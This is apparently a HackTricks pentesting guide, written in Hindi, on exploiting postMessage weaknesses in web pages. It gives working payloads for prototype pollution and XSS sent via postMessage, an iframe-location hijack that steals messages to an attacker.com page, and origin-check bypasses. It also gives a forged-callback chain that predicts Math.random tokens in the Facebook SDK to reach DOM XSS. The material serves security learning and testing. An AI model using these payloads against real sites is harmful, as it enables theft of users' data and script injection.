# PostMessage कमजोरियाँ

{{#include ../../banners/hacktricks-training.md}}

## भेजें **PostMessage**

**PostMessage** संदेश भेजने के लिए निम्नलिखित function का उपयोग करता है:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
ध्यान दें कि **targetOrigin** '\*' हो सकता है या एक URL जैसे _https://company.com._\
दूसरे परिदृश्य में, **संदेश केवल उस डोमेन को ही भेजा जा सकता है** (भले ही Window object का origin अलग हो)।\
यदि **wildcard** का उपयोग किया गया है, तो **संदेश किसी भी डोमेन को भेजे जा सकते हैं**, और वे Window object के origin पर भेजे जाएंगे.

### Attacking iframe & wildcard in **targetOrigin**

जैसा कि [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) में बताया गया है, अगर आपको ऐसा कोई पेज मिलता है जिसे **iframed** किया जा सकता है (कोई `X-Frame-Header` सुरक्षा नहीं) और जो **postMessage** के जरिए **संवेदनशील** संदेश भेज रहा है और **wildcard** (\*) का उपयोग कर रहा है, तो आप **iframe** के **origin** को **modify** कर सकते हैं और उस **संवेदनशील** संदेश को अपनी नियंत्रित डोमेन पर **leak** कर सकते हैं.\  
ध्यान दें कि अगर पेज iframed किया जा सकता है लेकिन **targetOrigin** **एक URL पर सेट है और wildcard पर नहीं**, तो यह **तरीका** काम नहीं करेगा.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** JS में उस function को declare करने के लिए इस्तेमाल होने वाला function है जो **`postMessages`** की उम्मीद करता है।\
निम्नलिखित जैसा कोड उपयोग किया जाएगा:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
ध्यान दें कि इस मामले में कोड जो सबसे पहली चीज़ कर रहा है वह **origin की जाँच** करना है। यह बेहद **महत्वपूर्ण** है, खासकर जब पेज प्राप्त जानकारी के साथ कोई **संवेदनशील** काम करने वाला हो (जैसे पासवर्ड बदलना)। **यदि यह origin की जाँच नहीं करता, attackers पीड़ितों से arbitrary data इन endpoints पर भेजवा सकते हैं** और इस उदाहरण में पीड़ितों के पासवर्ड बदल सकते हैं।

### Enumeration

इसी पेज में event listeners खोजने के लिए आप:

- **JS कोड में खोजें** `window.addEventListener` और `$(window).on` (_JQuery version_)
- **Developer tools के console में चलाएँ:** `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Browser के developer tools में जाएँ --> Elements --> Event Listeners**

![](<../../images/image (396).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) या [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) जैसे **browser extension** का उपयोग करें। ये extensions सभी संदेशों को **intercept** करेंगे और आपको दिखाएँगे।

### Origin check bypasses

- **`event.isTrusted`** attribute को secure माना जाता है क्योंकि यह केवल उन events के लिए `True` लौटाता है जो genuine user actions से उत्पन्न होते हैं। सही तरीके से लागू होने पर इसे bypass करना कठिन है, पर इसकी सुरक्षा जांचों में अहमियत है।
- PostMessage events में origin validation के लिए **`indexOf()`** का उपयोग bypass होने के प्रति संवेदनशील हो सकता है। इस कमजोरि का एक उदाहरण यह है:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()` से आने वाली **`search()`** मेथड regular expressions के लिये बनायी गयी है, न कि सामान्य strings के लिये। regexp के अलावा कुछ पास करने पर implicit conversion regex में हो जाता है, जिससे मेथड संभावित रूप से insecure बन सकती है। regexp में dot (.) wildcard की तरह काम करता है, जिससे specially crafted domains के साथ validation bypass करना संभव होता है। उदाहरण के लिये:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** फ़ंक्शन भी `search()` की तरह regex प्रोसेस करता है। यदि regex गलत तरीके से बना हो तो यह भी bypass होने योग्य हो सकता है।
- **`escapeHtml`** फ़ंक्शन inputs को sanitize करने के लिए characters को escape करने का प्रयोजन रखता है। हालाँकि, यह नया escaped object नहीं बनाता बल्कि मौजूदा object की properties को overwrite कर देता है। इस व्यवहार का दुरुपयोग किया जा सकता है। विशेषकर, यदि किसी object को इस तरह manipulate किया जा सके कि उसकी controlled property `hasOwnProperty` को मान्यता न दे, तो `escapeHtml` अपेक्षित रूप से काम नहीं करेगी। नीचे उदाहरण दिए गए हैं:

- अपेक्षित असफलता:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- escape को bypass करना:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

इस vulnerability के संदर्भ में, `File` object विशेष रूप से exploit होने योग्य है क्योंकि इसकी `name` property read-only है। जब यह property templates में उपयोग होती है, तो `escapeHtml` द्वारा sanitize नहीं की जाती, जिससे संभावित सुरक्षा जोखिम उत्पन्न होते हैं।

- JavaScript में `document.domain` property को किसी script द्वारा सेट करके domain को छोटा किया जा सकता है, जिससे same-origin policy के नियमों को parent domain के भीतर अधिक relaxed तरीके से लागू किया जा सके।

### e.origin == window.origin bypass

जब किसी वेब पेज को **sandboxed iframe** में embed किया जाता है using %%%%%%, तो यह समझना महत्वपूर्ण है कि iframe का origin `null` सेट हो जाएगा। यह sandbox attributes और उनकी सुरक्षा व कार्यक्षमता पर असर डालता है।

sandbox attribute में **`allow-popups`** निर्दिष्ट करने पर, iframe के भीतर से खोले गए किसी भी popup window को उसके parent के sandbox restrictions विरासत में मिलते हैं। इसका मतलब है कि जब तक **`allow-popups-to-escape-sandbox`** attribute भी शामिल न किया गया हो, popup window का origin भी समान रूप से `null` सेट होगा, जो iframe के origin के अनुरूप होगा।

परिणामस्वरूप, जब ऐसे शर्तों के अंतर्गत popup खोली जाती है और iframe से popup को **`postMessage`** के ज़रिये संदेश भेजा जाता है, तो भेजने और प्राप्त करने दोनों पक्षों के origin `null` होते हैं। इससे यह स्थिति बनती है जहाँ **`e.origin == window.origin`** true मानता है (`null == null`), क्योंकि iframe और popup दोनों का origin मान `null` समान है।

अधिक जानकारी के लिए पढ़ें:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

यह जांचना संभव है कि संदेश उसी window से आया था जिसमें script सुन रही है (विशेष रूप से **Content Scripts from browser extensions** के लिए यह रुचिकर है ताकि वे जाँच सकें कि संदेश उसी पेज से भेजा गया था):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
आप किसी संदेश के **`e.source`** को null करने के लिए एक **iframe** बना सकते हैं जो **sends** the **postMessage** और जिसे **immediately deleted** कर दिया जाता है।

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

इन हमलों को करने के लिए आदर्श रूप से आप **put the victim web page** को एक `iframe` के अंदर रख पाएँगे। लेकिन कुछ headers जैसे `X-Frame-Header` उस **behaviour** को **prevent** कर सकते हैं।\
ऐसे परिदृश्यों में आप फिर भी कम stealthy attack का उपयोग कर सकते हैं। आप vulnerable web application के लिए एक नया tab खोल सकते हैं और इसके साथ communicate कर सकते हैं:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### मुख्य पृष्ठ को ब्लॉक करके child iframe को भेजा गया संदेश चुराना

नीचे दिए पृष्ठ में आप देख सकते हैं कि कैसे आप एक **sensitive postmessage data** जो एक **child iframe** को भेजा गया है, उसे चोरी कर सकते हैं — डेटा भेजने से पहले **blocking** करके और child में मौजूद **XSS in the child** का दुरुपयोग करके डेटा प्राप्त होने से पहले ही **leak the data** करवा सकते हैं:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe location बदलकर संदेश चोरी करना

यदि आप बिना X-Frame-Header वाली किसी webpage को iframe कर पाते हैं जिसमें एक और iframe शामिल है, तो आप उस child iframe का **change the location of that child iframe** कर सकते हैं, इसलिए यदि वह **postmessage** प्राप्त कर रहा है जिसे एक **wildcard** का उपयोग करके भेजा गया है, तो एक attacker उस iframe का **origin** एक पेज में **change** कर सकता है जो उसके द्वारा **controlled** हो और संदेश को **steal** कर सकता है:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage से Prototype Pollution और/या XSS

ऐसे परिदृश्यों में जहाँ `postMessage` के माध्यम से भेजा गया डेटा JS द्वारा execute होता है, आप पेज को **iframe** कर सकते हैं और `postMessage` के जरिए exploit भेजकर **prototype pollution/XSS** का दुरुपयोग कर सकते हैं।

A couple of **बहुत अच्छे से समझाए गए XSS `postMessage` के जरिए** मिलते हैं: [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

एक उदाहरण जो `postMessage` के जरिए एक `iframe` को भेजकर **Prototype Pollution and then XSS** का दुरुपयोग करता है:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
**अधिक जानकारी के लिए**:

- [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html) के बारे में पेज का लिंक
- [**XSS**](../xss-cross-site-scripting/index.html) के बारे में पेज का लिंक
- [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss) के बारे में पेज का लिंक

### postMessage ब्रिज में **`Math.random()`** callback tokens की भविष्यवाणी

जब message validation एक “shared secret” का उपयोग करता है जो `Math.random()` से जनरेट होता है (उदा., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) और वही helper plugin iframes का नाम भी रखता है, तो आप PRNG outputs रिकवर करके trusted messages फोर्ज कर सकते हैं:

- **Leak PRNG outputs via `window.name`:** SDK plugin iframes को `guid()` से ऑटो-नाम देता है। अगर आप top frame को नियंत्रित करते हैं, तो victim page को iframe करें, फिर plugin iframe को अपने origin पर नेविगेट करें (उदा., `window.frames[0].frames[0].location='https://attacker.com'`) और `window.frames[0].frames[0].name` पढ़कर एक raw `Math.random()` output प्राप्त करें।
- **Force more outputs without reloads:** कुछ SDKs एक reinit path expose करते हैं; FB SDK में, `init:post` को `{xfbml:1}` के साथ फायर करने से `XFBML.parse()` होता है, plugin iframe destroy/recreate होता है, और नए names/callback IDs generate होते हैं। बार-बार reinit आवश्यक PRNG outputs उतनी बार पैदा कर देता है (ध्यान दें कि callback/iframe IDs के लिए अतिरिक्त internal `Math.random()` calls होते हैं, इसलिए solvers को बीच के मान स्किप करने होंगे)।
- **Trusted-origin delivery via parameter pollution:** अगर कोई first-party plugin endpoint एक unsanitized parameter को cross-window payload में reflect करता है (उदा., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), तो आप trusted `facebook.com` origin को बरकरार रखते हुए `&type=...&iconSVG=...` inject कर सकते हैं।
- **Predict the next callback:** Leak किए गए iframe names को `[0,1)` में floats में बदलें और कई मान (यहाँ तक कि non-consecutive) को V8 `Math.random` predictor (उदा., Z3-based) में डालें। लोकल में अगला `guid()` generate करें ताकि अपेक्षित callback token को forge किया जा सके।
- **Trigger the sink:** postMessage data को इस तरह craft करें कि bridge `xd.mpn.setupIconIframe` dispatch करे और `iconSVG` में HTML inject करे (उदा., URL-encoded `<img src=x onerror=...>`), जिससे hosting origin के अंदर DOM XSS प्राप्त होता है; वहाँ से same-origin iframes (OAuth dialogs, arbiters, आदि) पढ़े जा सकते हैं।
- **Framing quirks help:** इस चेन के लिए framing आवश्यक है। कुछ mobile webviews में, जब `frame-ancestors` मौजूद होता है तो `X-Frame-Options` unsupported `ALLOW-FROM` में degrade हो सकता है, और “compat” parameters permissive `frame-ancestors` को force कर सकते हैं, जिससे `window.name` side channel सक्षम होता है।

#### न्यूनतम फोर्ज्ड संदेश उदाहरण
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## संदर्भ

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- अभ्यास के लिए: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
